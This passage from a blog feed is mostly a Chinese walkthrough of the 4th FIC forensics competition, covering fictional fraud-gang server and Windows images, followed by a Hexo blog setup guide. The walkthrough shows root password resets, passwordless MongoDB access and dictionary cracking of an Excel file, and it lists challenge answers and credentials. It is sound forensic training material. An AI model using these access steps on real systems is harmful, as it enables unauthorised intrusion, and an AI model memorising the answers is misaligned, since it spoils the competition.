`app_group_redpacket_member`<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 总金额 <span class="hljs-keyword">DESC</span><br><br><span class="hljs-keyword">SELECT</span> login_ip <span class="hljs-keyword">FROM</span> `app_user_info` <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">90671142</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094000394.png"></p><p><img src="/img/blogimg/20240619094001395.png"></p><blockquote><p>数据库中记录的提现成功的金额总记是多少（不考虑手续费） 【答题格式：20.12】<br>35821148.48</p></blockquote><p>提现记录在app_user_withdraw表中</p><p><img src="/img/blogimg/20240619094001400.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">FROM</span> `app_user_withdraw` <span class="hljs-keyword">WHERE</span> `status` <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094001404.png"></p><blockquote><p>rocketchat服务器中，有几个真实用户？【答题格式：1】<br>3</p></blockquote><p><img src="/img/blogimg/20240619094002408.png"></p><p>根据赵某的计算机Chrome浏览器记录，聊天系统应该是在3000端口上，访问<a href="http://192.168.8.16:3000/home">http://192.168.8.16:3000/home</a></p><p><img src="/img/blogimg/20240619094002410.png"></p><p>用之前的账户密码登录</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span>@<span class="hljs-literal">admin</span>.com<br>Zhao<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094002416.png"></p><blockquote><p>rocketchat服务器中，聊天服务的端口号是？ 【答题格式：80】<br>3000</p></blockquote><p>见上题</p><blockquote><p>rocketchat服务器中，聊天服务的管理员的邮箱是？【答题格式：<a href="mailto:&#x61;&#98;&#99;&#64;&#97;&#x62;&#99;&#x2e;&#x63;&#111;&#x6d;">&#x61;&#98;&#99;&#64;&#97;&#x62;&#99;&#x2e;&#x63;&#111;&#x6d;</a>】<br><a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x61;&#x64;&#109;&#x69;&#x6e;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x61;&#x64;&#109;&#x69;&#x6e;&#x2e;&#99;&#x6f;&#109;</a></p></blockquote><p><img src="/img/blogimg/20240619094003424.png"></p><blockquote><p>rocketchat服务器中，聊天服务使用的数据库的版本号是？【答题格式：1.2.34】<br>5.0.24</p></blockquote><p><img src="/img/blogimg/20240619094003428.png"></p><p><img src="/img/blogimg/20240619094003429.png"></p><blockquote><p>rocketchat服务器中，最大的文件上传大小是？（以字节为单位）【答题格式：1024】<br>104857600</p></blockquote><p><img src="/img/blogimg/20240619094004433.png"></p><blockquote><p>rocketchat服务器中，管理员账号的创建时间为？<br>A.2024&#x2F;3&#x2F;14  8:18:54<br>B.2024&#x2F;3&#x2F;14  8:19:54<br>C.2024&#x2F;3&#x2F;14  8:17:54<br>D.2024&#x2F;3&#x2F;14  8:15:54</p><p>B</p></blockquote><p>密码表爆不出来这台服务器的密码，参考<a href="https://cn.linux-console.net/?p=1538%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81">https://cn.linux-console.net/?p=1538重置密码</a></p><p><img src="/img/blogimg/20240619094004441.png"></p><p>ssh登录被拒，可能是没开远程ssh，修改一下配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094004446.png"></p><p>修改完重启ssh即可</p><p><img src="/img/blogimg/20240619094005448.png"></p><p>可以看到数据库运行在docker里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@debian:~<span class="hljs-comment"># docker ps</span><br>CONTAINER ID   IMAGE                                                COMMAND                  CREATED       STATUS         PORTS                    NAMES<br>160c806d13ea   registry.rocket.chat/rocketchat/rocket.chat:latest   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   6 weeks ago   Up 8 minutes   0.0.0.0:3000-&gt;3000/tcp   rocketchat-rocketchat-1<br>929dad307aa4   bitnami/mongodb:5.0                                  <span class="hljs-string">&quot;/opt/bitnami/script…&quot;</span>   6 weeks ago   Up 8 minutes   27017/tcp                rocketchat-mongodb-1<br></code></pre></td></tr></table></figure><p>查看容器元数据发现可以空密码登录，端口在27017</p><p><img src="/img/blogimg/20240619094005457.png"></p><p>但是本地这个端口没有服务在运行</p><p><img src="/img/blogimg/20240619094005459.png"></p><p>查看容器元数据看到ip在172.18.0.2</p><p><img src="/img/blogimg/20240619094005461.png"></p><p>navicat连接</p><p><img src="/img/blogimg/20240619094006463.png"></p><p><img src="/img/blogimg/20240619094006464.png"></p><p><img src="/img/blogimg/20240619094006465.png"></p><blockquote><p>rocketchat服务器中，技术员提供的涉诈网站地址是？【答题格式：<a href="http://192.168.1.1】/">http://192.168.1.1】</a><br><a href="http://172.16.80.47/">http://172.16.80.47</a></p></blockquote><p><img src="/img/blogimg/20240619094006469.png"></p><blockquote><p>综合分析服务器，该团伙的利润分配方案中，老李的利润占比是多少【答题格式：10%】<br>35%</p></blockquote><p>见上题</p><blockquote><p>综合分析服务器，该团队“杀猪盘”收网的可能时间段为<br>A.2024&#x2F;3&#x2F;15  15:00:00-16:00:00<br>B.2024&#x2F;3&#x2F;15  16:00:00-17:00:00<br>C.2024&#x2F;3&#x2F;15  17:00:00-18:00:00<br>D.2024&#x2F;3&#x2F;15  18:00:00-19:00:00</p></blockquote><p>见上题，UTC+8</p><blockquote><p>请综合分析，警方未抓获的重要嫌疑人，其使用聊天平台时注册邮箱号为？【答题格式：<a href="mailto:&#x61;&#98;&#x63;&#64;&#x61;&#97;&#x2e;&#x63;&#111;&#109;">&#x61;&#98;&#x63;&#64;&#x61;&#97;&#x2e;&#x63;&#111;&#109;</a>】<br><a href="mailto:&#x6c;&#97;&#111;&#64;&#115;&#117;&#x2e;&#99;&#111;&#109;">&#x6c;&#97;&#111;&#64;&#115;&#117;&#x2e;&#99;&#111;&#109;</a></p></blockquote><p>老苏的邮箱</p><p><img src="/img/blogimg/20240619094007485.png"></p><blockquote><p>分析openwrt镜像，该系统的主机名为【答题格式：MyPC】<br>iStoreOS</p></blockquote><p><img src="/img/blogimg/20240619094007489.png"></p><blockquote><p>分析openwrt镜像，该系统的内核版本为【答题格式：12.34.56】<br>5.10.201</p></blockquote><p><img src="/img/blogimg/20240619094007493.png"></p><blockquote><p>分析openwrt镜像，该静态ip地址为【答题格式：192.168.1.1】<br>192.168.8.5</p></blockquote><p>静态分析网卡配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iStoreOS:~<span class="hljs-comment"># cat /etc/config/network </span><br><br>config interface <span class="hljs-string">&#x27;loopback&#x27;</span><br>        option device <span class="hljs-string">&#x27;lo&#x27;</span><br>        option proto <span class="hljs-string">&#x27;static&#x27;</span><br>        option ipaddr <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>        option netmask <span class="hljs-string">&#x27;255.0.0.0&#x27;</span><br><br>config globals <span class="hljs-string">&#x27;globals&#x27;</span><br>        option ula_prefix <span class="hljs-string">&#x27;fdbc:6f08:9c51::/48&#x27;</span><br><br>config device<br>        option name <span class="hljs-string">&#x27;br-lan&#x27;</span><br>        option <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bridge&#x27;</span><br>        list ports <span class="hljs-string">&#x27;eth0&#x27;</span><br><br>config interface <span class="hljs-string">&#x27;lan&#x27;</span><br>        option device <span class="hljs-string">&#x27;br-lan&#x27;</span><br>        option ipaddr <span class="hljs-string">&#x27;192.168.8.5&#x27;</span><br>        option netmask <span class="hljs-string">&#x27;255.255.255.0&#x27;</span><br>        option ip6assign <span class="hljs-string">&#x27;60&#x27;</span><br>        option proto <span class="hljs-string">&#x27;dhcp&#x27;</span><br><br>loopback 接口：这是一个虚拟接口，用于本地回环。IP 地址为 127.0.0.1，子网掩码为 255.0.0.0。它用于在同一设备上测试网络服务，而无需实际发送数据包到网络。<br>globals 配置：这里定义了一个全局唯一本地地址（ULA）前缀，用于生成 IPv6 地址。<br>device 配置：这是一个设备定义，将物理接口 eth0 添加到名为 br-lan 的网桥上。网桥是一个虚拟设备，用于连接多个网络接口。<br>lan 接口：这是一个网络接口配置，用于连接局域网（LAN）。它的 IP 地址为 192.168.8.5，子网掩码为 255.255.255.0，并且使用 DHCP 协议自动获取 IP 地址。<br></code></pre></td></tr></table></figure><p>也可以结合计算机的浏览记录和<code>ip addr</code>确定</p><p><img src="/img/blogimg/20240619094008528.png"></p><blockquote><p>分析openwrt镜像，所用网卡的名称为【答题格式：abc123】<br>eth0</p></blockquote><p>见上题或登录后台查看</p><p>计算机镜像里面有密码</p><p><img src="/img/blogimg/20240619094008534.png"></p><p><img src="/img/blogimg/20240619094008535.png"></p><blockquote><p>分析openwrt镜像，该系统中装的docker的版本号为【答题格式：12.34.56】<br>20.10.22</p></blockquote><p><img src="/img/blogimg/20240619094009539.png"></p><blockquote><p>分析openwrt镜像，nastools的配置文件路径为【答题格式：&#x2F;abc&#x2F;abc&#x2F;abc】<br>&#x2F;root&#x2F;Configs&#x2F;NasTools</p></blockquote><p><img src="/img/blogimg/20240619094009543.png"></p><blockquote><p>分析openwrt镜像，使用的vpn代理软件为【答题格式（忽略大小写）：abc123】<br>PassWall2</p></blockquote><p><img src="/img/blogimg/20240619094009547.png"></p><blockquote><p>分析openwrt镜像，vpn实际有多少个可用节点【答题格式：6】<br>53</p></blockquote><p>第一个结点为套餐情况，不是可用结点</p><p><img src="/img/blogimg/20240619094009552.png"></p><blockquote><p>分析openwrt镜像，节点socks的监听端口是多少【答题格式：1234】<br>1070</p></blockquote><p><img src="/img/blogimg/20240619094010556.png"></p><blockquote><p>分析openwrt镜像，vpn的订阅链接是【答题格式：<a href="http://www.baidu.com/aaa/bbb/ccc/ddd?privatekey=abc123456789%E3%80%91">http://www.baidu.com/aaa/bbb/ccc/ddd?privatekey=abc123456789】</a><br><a href="https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a">https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a</a></p></blockquote><p><img src="/img/blogimg/20240619094010560.png"></p><h1 id="windows镜像"><a href="#windows镜像" class="headerlink" title="windows镜像"></a>windows镜像</h1><blockquote><p>1.分析技术员赵某的windows镜像，并计算赵某计算机的原始镜像的SHA1值为？忽略大小写<br>FFD2777C0B966D5FC07F2BAED1DA5782F8DE5AD6</p></blockquote><p><img src="/img/blogimg/20240619094011565.png"></p><p><img src="/img/blogimg/20240619094011566.png"></p><blockquote><p>2.分析技术员赵某的windows镜像，疑似VeraCrypt加密容器的文件的SHA1值为？忽略大小写<br>b25e2804b586394778c800d410ed7bcdc05a19c8</p></blockquote><p>用火眼的特征分析得出，路径：检材3-计算机.E01&#x2F;分区6&#x2F;Users&#x2F;L&#x2F;Documents&#x2F;2024.fic，导出后计算sha1</p><p><img src="/img/blogimg/20240619094011571.png"></p><p><img src="/img/blogimg/20240619094011572.png"></p><blockquote><p>3.据赵某供述，他会将常用的密码放置在一个文档内，分析技术员赵某的windows镜像，找到技术员赵某的密码字典，并计算该文件的SHA1值?忽略大小写<br>E6EB3D28C53E903A71880961ABB553EF09089007</p></blockquote><p>路径：<code>检材3-计算机.E01/分区6/Users/L/Documents/</code></p><p><img src="/img/blogimg/20240619094012577.png"></p><blockquote><p>4.据赵某供述，他将加密容器的密码隐写在一张图片内，隐写在图片中的容器密码是?<br>qwerasdfzxcv</p></blockquote><p>documents目录下有一张可疑图片，查看十六进制数据就能得到密码</p><p><img src="/img/blogimg/20240619094012582.png"></p><p><img src="/img/blogimg/20240619094013584.png"></p><blockquote><p>5.分析技术员赵某的windows镜像，bitlocker的恢复密钥是什么【答题格式：111111-222222-333333-444444-555555-666666-777777-888888】<br>404052-011088-453090-291500-377751-349536-330429-257235</p></blockquote><p>用刚才的密码解密2024.fic</p><p><img src="/img/blogimg/20240619094013589.png"></p><blockquote><p>6.分析技术员赵某的windows镜像，bitlocker分区的起始扇区数是【答题格式：1024】<br>146794496</p></blockquote><p><img src="/img/blogimg/20240619094013593.png"></p><blockquote><p>7.分析技术员赵某的windows镜像，默认的浏览器是<br>A.Chrome<br>B.Edge<br>C.IE<br>D.firefox</p><p>A</p></blockquote><p><img src="/img/blogimg/20240619094014600.png"></p><p><img src="/img/blogimg/20240619094014601.png"></p><blockquote><p>8.分析技术员赵某的windows镜像，私有聊天服务器的密码为【答题格式：abc123】<br>Zhao</p></blockquote><p>解密后的分区里面有一个私有聊天密码.txt，第一行应该是用户名</p><p><img src="/img/blogimg/20240619094014606.png"></p><blockquote><p>9.分析技术员赵某的windows镜像，嫌疑人计算机中有疑似使用AI技术生成的进行赌博宣传的图片，该图片中，宣传的赌博网站地址为？【答题格式：<a href="http://www.baidu.com】/">www.baidu.com】</a><br><a href="http://www.585975.com/">www.585975.com</a></p></blockquote><p>仿真后翻一下加密盘的图片</p><p><img src="/img/blogimg/20240619094015611.png"></p><blockquote><p>10.分析技术员赵某的windows镜像，赵某使用的AI换脸工具名称为？【答题格式：abcd】<br>A.stable diffusion<br>B.ROOP<br>C.Midjourney<br>D.DiffusionDraw</p><p>B</p></blockquote><p>powershell的历史记录里面有一个run.py，查找这个文件</p><p><img src="/img/blogimg/20240619094015619.png"></p><p>都是在一个目录下面</p><p><img src="/img/blogimg/20240619094015621.png"></p><p>进虚拟机里面看一下这个目录</p><p><img src="/img/blogimg/20240619094016623.png"></p><blockquote><p>11.分析技术员赵某的windows镜像，使用AI换脸功能生成了一张图片，该图片的名称为【答题格式：1.txt】<br>db.jpg</p></blockquote><p>查看readme，结合执行的命令可知–output为输出结果</p><p><img src="/img/blogimg/20240619094016628.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">.\python <span class="hljs-string">..</span>\run.py <span class="hljs-params">--source</span> <span class="hljs-string">&quot;E:/dst01.jpeg&quot;</span> <span class="hljs-params">--target</span> <span class="hljs-string">&quot;E:/1.pjpg&quot;</span> <span class="hljs-params">--output</span> <span class="hljs-string">&quot;E:/db.jpg&quot;</span> <span class="hljs-params">--frame-processor</span> face_swapper face_enhancer <span class="hljs-params">--similar-face-distance</span> 0.85 <span class="hljs-params">--temp-frame-format</span> png <span class="hljs-params">--temp-frame-quality</span> 18 <span class="hljs-params">--output-video-quality</span> 18 <span class="hljs-params">--max-memory</span> 4 <span class="hljs-params">--execution-provider</span> cpu <span class="hljs-params">--execution-threads</span> 4<br></code></pre></td></tr></table></figure><blockquote><p>12.分析技术员赵某的windows镜像，ai换脸生成图片的参数中–similar-face-distance值为【答题格式：20.12】<br>0.85</p></blockquote><p>见上题</p><blockquote><p>13.分析技术员赵某的windows镜像，嫌疑人使用AI换脸功能所使用的原始图片名称为【答题格式：abc.txt】<br>dst01.jpeg</p></blockquote><p>见上上题</p><blockquote><p>14.分析技术员赵某的windows镜像，赵某与李某沟通中提到的“二维码”解密所用的网站url地址为？【答题格式：<a href="http://www.baidu.com/1.html%E3%80%91">http://www.baidu.com/1.html】</a><br><a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p></blockquote><p>查看浏览器历史记录</p><p><img src="/img/blogimg/20240619094016644.png"></p><blockquote><p>15.分析技术员赵某的windows镜像，赵某架设聊天服务器的原始IP地址为？【答题格式：192.168.1.1】<br>192.168.8.17</p></blockquote><p><img src="/img/blogimg/20240619094017648.png"></p><p><img src="/img/blogimg/20240619094017649.png"></p><blockquote><p>16.分析技术员赵某的windows镜像，据赵某交代，其在窝点中直接操作服务器进行部署，环境搭建好了之后，使用个人计算机登录聊天室进行沟通，请分析赵某第一次访问聊天室的时间为？<br>A.2024-03-14 20:30:08<br>B.2024-03-14 20:31:08<br>C.2024-03-14 20:32:08<br>D.2024-03-14 20:33:08</p><p>C</p></blockquote><p><img src="/img/blogimg/20240619094017656.png"></p><blockquote><p>17.分析技术员赵某的windows镜像，openwrt的后台管理密码是<br>hl@7001</p></blockquote><p>结合前面的服务器集群来看，openwrt的网址：</p><p><img src="/img/blogimg/20240619094018661.png"></p><p><img src="/img/blogimg/20240619094018662.png"></p><blockquote><p>18.分析技术员赵某的windows镜像，嫌疑人可能使用什么云来进行文件存储？【答题格式：阿里云】<br>易有云</p></blockquote><p><img src="/img/blogimg/20240619094018666.png"></p><blockquote><p>19.分析技术员赵某的windows镜像，工资表密码是多少【答题格式：abc123】<br>aa123456</p></blockquote><p>BitLocker加密分区中有一个名单.xlsx</p><p><img src="/img/blogimg/20240619094019671.png"></p><p>结合运维笔记，用commonPwd.txt暴力破解</p><p><img src="/img/blogimg/20240619094019673.png"></p><p><img src="/img/blogimg/20240619094019674.png"></p><p><img src="/img/blogimg/20240619094019675.png"></p><blockquote><p>20.分析技术员赵某的windows镜像，张伟的工资是多少【答题格式：20】<br>28300</p></blockquote><p><img src="/img/blogimg/20240619094019679.png"></p>]]></content>
    
    
    <summary type="html">第四届FIC取证竞赛复盘</summary>
    
    
    
    <category term="取证" scheme="https://cvbxy.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="取证" scheme="https://cvbxy.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
    <category term="FIC" scheme="https://cvbxy.github.io/tags/FIC/"/>
    
  </entry>
  
  <entry>
    <title>github+hexo博客搭建记录</title>
    <link href="https://cvbxy.github.io/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://cvbxy.github.io/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2023-06-20T05:40:27.000Z</published>
    <updated>2023-06-20T06:40:22.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><p>下载：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a> ，安装一路next就行，验证是否安装成功</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br></code></pre></td></tr></table></figure><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><p>下载：<a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a> ，安装一路next，验证是否安装成功</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">git <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h1 id="注册github及创建仓库"><a href="#注册github及创建仓库" class="headerlink" title="注册github及创建仓库"></a>注册github及创建仓库</h1><p>在<code>Repository name</code>填上之后用来访问的域名，格式为<code>xxx.github.io</code>，然后创建</p><p><img src="/img/blogimg/image-20230620134715015.png"></p><p>创建完后会有一个HTTP链接，在仓库首页也能找到，将这个链接复制下来备用</p><p><img src="/img/blogimg/image-20230620135019889.png"></p><h1 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h1><p>在本地新建一个空目录来存放博客相关的文件，进入这个目录，右键单击<code>Git Bash Here</code>，进入git的命令行(Windows的命令行可能会有问题，统一用git的)</p><p><img src="/img/blogimg/image-20230620135210032.png"></p><p>因为是从国外服务器下载，所以我们配置一下连接国内淘宝官方的服务器</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install -g cnpm --registry=https://registry.<span class="hljs-built_in">npm</span>.taobao.org<br>之后再次使用命令则是以cnpm开头，而不是<span class="hljs-built_in">npm</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install -g hexo-cli<br><span class="hljs-comment"># 初始化</span><br>hexo init<br><span class="hljs-comment"># 启动HEXO，可以在http://127.0.0.1:4000/看到一篇样例博客</span><br>hexo s<br><span class="hljs-comment"># 关闭HEXO</span><br>ctrl + c<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/image-20230620135654170.png"></p><h1 id="配置SSH免密登录"><a href="#配置SSH免密登录" class="headerlink" title="配置SSH免密登录"></a>配置SSH免密登录</h1><p>在<code>C:\Users\用户名</code>文件夹下右键打开<code>Git Bash Here</code>输入命令：<code>ssh-keygen -t rsa -C github邮件地址</code> ，输入后连敲三次回车生成.ssh秘钥。</p><p>之后会生成一个新的<code>C:\Users\用户名\.ssh</code>文件夹，打开这个文件夹，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容。</p><p>打开github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key，把复制的内容粘贴进去，title随便填，保存即可，设置好的界面：</p><p><img src="/img/blogimg/image-20230620140108396.png"></p><p>检测是否设置成功(在git bash输入)：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@github</span>.com<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/image-20230620140228351.png"></p><p>然后再输入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;xxx&quot;</span><span class="hljs-comment">// 你的github用户名，非昵称</span><br>git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span>  <span class="hljs-string">&quot;xxx@qq.com&quot;</span><span class="hljs-comment">// 填写你的github注册邮箱</span><br></code></pre></td></tr></table></figure><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>修改当时创建的空文件夹内的<code>_config.yml</code>文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">在文件的末尾修改(repository属性的地址就是之前创建仓库后所保存的http地址)<br><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol">repository:</span> https:<span class="hljs-comment">//github.com/xxx</span><br><span class="hljs-symbol">branch:</span> master<br></code></pre></td></tr></table></figure><p>安装hexo-deployer-git插件</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">cnpm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>新建一篇测试文章，文章默认生成在<code>\blog\source\_posts</code>下面</p><figure class="highlight plaintext"><figcaption><span>new “文章名称”</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hexo">hexo new “文章名称”<br></code></pre></td></tr></table></figure><p>将文章同步到github上去</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">博客搭建教程</summary>
    
    
    
    <category term="博客搭建" scheme="https://cvbxy.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://cvbxy.github.io/tags/Hexo/"/>
    
    <category term="Fluid" scheme="https://cvbxy.github.io/tags/Fluid/"/>
    
  </entry>
  
</feed>
